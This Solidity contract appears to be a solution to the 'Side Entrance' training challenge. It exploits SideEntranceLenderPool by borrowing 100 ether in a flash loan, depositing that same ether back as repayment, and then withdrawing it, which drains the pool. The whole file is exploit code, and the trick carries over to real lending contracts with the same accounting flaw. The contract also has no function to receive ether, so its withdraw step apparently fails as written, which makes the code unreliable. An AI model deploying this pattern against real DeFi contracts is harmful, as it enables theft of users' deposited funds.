// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";


contract SideEntranceExploiter is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public sideEntranceLenderPool;
    address public _owner;
    constructor(address payable _SideEntranceLenderPool){
        sideEntranceLenderPool = SideEntranceLenderPool(_SideEntranceLenderPool);
        _owner = msg.sender;
    }

    function initiateFlashLoan() external {
        require(msg.sender == _owner, 'only owner can call');
        sideEntranceLenderPool.flashLoan(100 ether);
        sideEntranceLenderPool.withdraw();
    }
    function execute() external override payable {
        sideEntranceLenderPool.deposit{value:msg.value}();
    }
}